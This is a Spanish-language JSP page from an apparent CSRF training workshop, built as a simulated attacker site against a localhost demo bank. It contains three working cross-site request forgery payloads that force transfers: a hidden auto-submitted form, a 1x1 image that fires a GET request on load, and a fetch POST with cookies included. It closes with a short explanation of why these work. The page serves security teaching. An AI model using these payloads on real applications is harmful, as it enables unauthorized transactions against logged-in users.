<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>Sitio Malicioso - CSRF Attack</title>
    <style>
        body { font-family: Arial; margin: 40px; background: #ffebee; }
        .attack-info { background: #f8d7da; padding: 20px; border-radius: 8px; margin: 20px 0; }
        .hidden-form { display: none; }
        .preview { background: white; padding: 15px; border-radius: 5px; margin: 10px 0; font-family: monospace; }
        .btn { background: #dc3545; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 5px; }
    </style>
</head>
<body>
    <div style="max-width: 800px; margin: 0 auto;">
        <h1>🎯 Sitio Malicioso - Demostración CSRF</h1>
        
        <div class="attack-info">
            <h3>⚠️ ESTA ES UNA PÁGINA DE ATAQUE SIMULADA</h3>
            <p>Esta página demuestra cómo un atacante podría ejecutar CSRF contra el banco vulnerable.</p>
            <p><strong>Instrucciones:</strong> Mantén la sesión del banco abierta en otra pestaña y interactúa con esta página.</p>
        </div>

        <!-- Ataque 1: Formulario Oculto Automático -->
        <div style="background: #fff3cd; padding: 20px; border-radius: 5px; margin: 20px 0;">
            <h3>🔓 Ataque 1: Formulario Oculto Automático</h3>
            <p>Este formulario se enviará automáticamente cuando hagas click en el botón:</p>
            
            <form id="csrfForm1" action="http://localhost:8080/csrf-workshop/transfer-process.jsp" method="POST" class="hidden-form">
                <input type="hidden" name="toAccount" value="987654321">
                <input type="hidden" name="amount" value="1000">
                <input type="hidden" name="description" value="Donación automática">
            </form>
            
            <button class="btn" onclick="executeAttack1()">🚀 Ejecutar Ataque CSRF</button>
            
            <div class="preview" id="preview1">
                <strong>Request que se enviará:</strong><br>
                POST /csrf-workshop/transfer-process.jsp<br>
                toAccount=987654321&amount=1000&description=Donación automática
            </div>
        </div>

        <!-- Ataque 2: Con Imagen -->
        <div style="background: #fff3cd; padding: 20px; border-radius: 5px; margin: 20px 0;">
            <h3>🖼️ Ataque 2: Usando Imagen</h3>
            <p>Esta imagen intentará ejecutar una transferencia cuando se cargue:</p>
            
            <img src="http://localhost:8080/csrf-workshop/transfer-process.jsp?toAccount=111222333&amount=500&description=Desde%20imagen" 
                 alt="Imagen inocente"
                 width="1" height="1"
                 onerror="imageFailed()">
            
            <div class="preview">
                <strong>Request de imagen:</strong><br>
                GET /csrf-workshop/transfer-process.jsp?toAccount=111222333&amount=500&description=Desde imagen
            </div>
        </div>

        <!-- Ataque 3: JavaScript Fetch -->
        <div style="background: #fff3cd; padding: 20px; border-radius: 5px; margin: 20px 0;">
            <h3>⚡ Ataque 3: JavaScript Fetch</h3>
            <p>JavaScript puede enviar requests directamente:</p>
            
            <button class="btn" onclick="executeFetchAttack()">📡 Enviar con Fetch</button>
            
            <div class="preview" id="fetchPreview">
                Esperando ejecución...
            </div>
        </div>

        <script>
        function executeAttack1() {
            document.getElementById('preview1').innerHTML = 
                '<strong style="color: green;">✅ Ataque ejecutado!</strong><br>' +
                'Revisa la aplicación bancaria para ver la transferencia no autorizada.';
            
            setTimeout(() => {
                document.getElementById('csrfForm1').submit();
            }, 1000);
        }
        
        function imageFailed() {
            // La imagen falla intencionalmente, pero el request GET se envió
            console.log('Image CSRF attack attempted');
        }
        
        function executeFetchAttack() {
            document.getElementById('fetchPreview').innerHTML = 
                '🔄 Enviando request CSRF via Fetch...';
            
            fetch('http://localhost:8080/csrf-workshop/transfer-process.jsp', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'toAccount=999888777&amount=300&description=Desde%20JavaScript',
                credentials: 'include' // Incluir cookies
            })
            .then(() => {
                document.getElementById('fetchPreview').innerHTML = 
                    '<strong style="color: green;">✅ Fetch CSRF ejecutado!</strong><br>' +
                    'El navegador envió las cookies automáticamente.';
            })
            .catch(error => {
                document.getElementById('fetchPreview').innerHTML = 
                    '❌ Error: ' + error;
            });
        }
        </script>

        <div style="background: #e7f3ff; padding: 20px; border-radius: 5px; margin-top: 30px;">
            <h3>🔍 Análisis del Ataque</h3>
            <p><strong>¿Por qué funciona?</strong></p>
            <ul>
                <li>El navegador envía las cookies AUTOMÁTICAMENTE</li>
                <li>El servidor confía en las cookies para autenticación</li>
                <li>No hay verificación del origen del request</li>
                <li>No hay tokens CSRF para validar intención</li>
            </ul>
            
            <p><a href="csrf-education.jsp">📚 Aprende más sobre CSRF</a></p>
        </div>

        <div style="text-align: center; margin-top: 30px;">
            <a href="dashboard.jsp">🏦 Volver al Banco</a> | 
            <a href="index.jsp">🏠 Inicio</a>
        </div>
    </div>
</body>
</html>